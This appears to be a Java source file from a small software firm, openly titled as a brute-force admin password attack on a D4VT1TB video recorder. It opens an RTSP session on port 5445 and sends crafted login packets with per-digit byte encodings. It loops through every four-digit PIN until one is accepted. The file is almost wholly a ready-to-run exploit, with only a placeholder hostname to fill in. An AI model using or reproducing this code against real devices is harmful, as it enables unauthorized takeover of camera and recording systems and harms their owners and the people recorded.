/**
 * Copyright 2018 Iron City Software LLC
 *
 * This is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this.  If not, see <http://www.gnu.org/licenses/>.
 */

package speco;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;

import com.google.common.base.Preconditions;
import com.google.common.io.ByteStreams;

/**
 * Brute force admin password attach on D4VT1TB.
 * Probably works on other units.
 * Tries all four digit numbers.
 */
public class Hack {
  public static void main(String args[]) throws Exception {
    new Hack().run();
  }

  private static final String HOSTNAME = "enter-your-hostname-here";
  private final InetAddress HOST;
  private static final int PORT = 5445;

  Map<Character, Byte> FIRST = new HashMap<>();
  Map<Character, Byte> SECOND = new HashMap<>();
  Map<Character, Byte> THIRD = new HashMap<>();
  Map<Character, Byte> FOURTH = new HashMap<>();

  byte USER_ADMIN[] = new byte[] { (byte) 0x80, 0x7b, (byte) 0x9d, (byte) 0x8e,
      (byte) 0x80 };

  int sequence = 0x1e;

  public Hack() throws Exception {
    FIRST.put('0', (byte) 0x57);
    FIRST.put('1', (byte) 0x56);
    FIRST.put('2', (byte) 0x55);
    FIRST.put('3', (byte) 0x54);
    FIRST.put('4', (byte) 0x53);
    FIRST.put('5', (byte) 0x52);
    FIRST.put('6', (byte) 0x51);
    FIRST.put('7', (byte) 0x50);
    FIRST.put('8', (byte) 0x5f);
    FIRST.put('9', (byte) 0x5e);

    SECOND.put('0', (byte) 0xa9);
    SECOND.put('1', (byte) 0xa8);
    SECOND.put('2', (byte) 0xab);
    SECOND.put('3', (byte) 0xaa);
    SECOND.put('4', (byte) 0xad);
    SECOND.put('5', (byte) 0xac);
    SECOND.put('6', (byte) 0xaf);
    SECOND.put('7', (byte) 0xae);
    SECOND.put('8', (byte) 0xa1);
    SECOND.put('9', (byte) 0xa0);

    THIRD.put('0', (byte) 0x98);
    THIRD.put('1', (byte) 0x99);
    THIRD.put('2', (byte) 0x9a);
    THIRD.put('3', (byte) 0x9b);
    THIRD.put('4', (byte) 0x9c);
    THIRD.put('5', (byte) 0x9d);
    THIRD.put('6', (byte) 0x9e);
    THIRD.put('7', (byte) 0x9f);
    THIRD.put('8', (byte) 0x90);
    THIRD.put('9', (byte) 0x91);

    FOURTH.put('0', (byte) 0x9a);
    FOURTH.put('1', (byte) 0x9b);
    FOURTH.put('2', (byte) 0x98);
    FOURTH.put('3', (byte) 0x99);
    FOURTH.put('4', (byte) 0x9e);
    FOURTH.put('5', (byte) 0x9f);
    FOURTH.put('6', (byte) 0x9c);
    FOURTH.put('7', (byte) 0x9d);
    FOURTH.put('8', (byte) 0x92);
    FOURTH.put('9', (byte) 0x93);

    HOST = InetAddress.getByName(HOSTNAME);
  }

  public void run() throws Exception {
    for (int i = 0; i <= 9999; ++i) {
      Thread.sleep(500);  // may not be necessary.
      String password = String.format("%04d", i);
      if (attempt(USER_ADMIN, password)) {
        System.out.println("\nThe password is " + password);
        return;
      } else {
        System.out.println(password + " tried and failed");
      }
    }
  }

  private boolean attempt(byte user[], String password) {
    while (true) {
      try {
        return attemptInternal(user, password);
      } catch (Exception e) {
        System.out.println("Retrying due to " + e.getMessage());
      }
    }
  }

  private boolean attemptInternal(byte user[], String password) throws Exception {
    Socket socket = new Socket(HOST, PORT);
    OutputStream output = socket.getOutputStream();
    InputStream input = socket.getInputStream();
    int sessionId = setupRequest(output, input);

    ByteArrayOutputStream req = new ByteArrayOutputStream();
    req.write(
        "GET_PARAMETER rtsp://111.111.111.111/Live/Channel=0 RTSP/1.0\r\n".getBytes());
    req.write("CSeq: 20637\r\n".getBytes());
    req.write("Content-type: text/parameters\r\n".getBytes());
    req.write(
        String.format("Session: %d;timeout=60\r\n", sessionId).getBytes());
    req.write("Content-length: 60\r\n".getBytes());
    req.write("\r\n".getBytes());
    req.write(new byte[] { 0x55, 0x4d, 0x53, 0x43, 0x3c, 0x00, 0x00, 0x00 });
    req.write(new byte[] { 0x10, 0x02, 0x14, 0x00 });

    // some kind of sequence byte
    req.write(new byte[] { (byte) (sequence % 255) });
    sequence += 2;

    req.write(new byte[] { 0x63, 0x24, 0x4e });

    req.write(user);

    req.write(new byte[] { 0x67, (byte) 0x99, (byte) 0xa8, (byte) 0xaa });
    req.write(new byte[] { (byte) 0xbe, 0x5e, 0x48, 0x02, (byte) 0x98, 0x4e });
    req.write(new byte[] { (byte) 0xe1, 0x1f, (byte) 0xf0, (byte) 0xe7, (byte) 0xee });

    // password
    req.write(FIRST.get(password.charAt(0)));
    req.write(SECOND.get(password.charAt(1)));
    req.write(THIRD.get(password.charAt(2)));
    req.write(FOURTH.get(password.charAt(3)));

    req.write(new byte[] { (byte) 0xbe, 0x5e, 0x48, 0x02, (byte) 0x98, 0x4e });
    req.write(new byte[] { (byte) 0xe1, 0x1f, (byte) 0xf0, (byte) 0xe7, (byte) 0xee });

    req.write(new byte[] { 0x67, (byte) 0x99, (byte) 0xa8, (byte) 0xaa,
        (byte) 0xbe, 0x5e, 0x48, 0x02, (byte) 0x88 });

    byte outputArray[] = req.toByteArray();
    // String outputAscii = BaseEncoding.base16().encode(outputArray);
    // System.out.println(outputArray.length);
    // System.out.println(outputAscii);

    output.write(outputArray);
    socket.shutdownOutput();

    byte response[] = ByteStreams.toByteArray(input);
    int key = response.length - 1;
    key -= 16;
    key -= 16;
    // String ascii = BaseEncoding.base16().encode(response);
    // System.out.println(ascii);
    Preconditions.checkState(response[key] == (byte) 0x4e);
    if (response[key + 1] == (byte) 0xe1) {
      return true;
    } else {
      return false;
    }
  }

  private int setupRequest(OutputStream output, InputStream input) throws Exception {
    String request = "SETUP rtsp:/111.111.111.111:5445/rtsp://" + HOSTNAME
        + "/video RTSP/1.0\r\n"
        + "CSeq: 20635\r\n"
        + "Transport: RTP/AVP/TCP;unicast;interleaved=0-1\r\n"
        + "User-Agent: UMS-RTSP-AtiveX Ver1.7.3.5\r\n"
        + "\r\n";
    output.write(request.getBytes());
    int expectedLength = 160 - 4;
    byte response[] = new byte[expectedLength];
    Preconditions.checkState(expectedLength == input.read(response));
    String responseText = new String(response);
    // System.out.println("Response is " + responseText);
    int index = responseText.indexOf("Session: ");
    Preconditions.checkState(index > -1);
    String fragment = responseText.substring(index + "Session: ".length());
    index = fragment.indexOf(";");
    Preconditions.checkState(index > -1);
    String sessionIdText = fragment.substring(0, index);
    // System.out.println("Session id is [" + sessionIdText + "]");
    return Integer.parseInt(sessionIdText);
  }

}
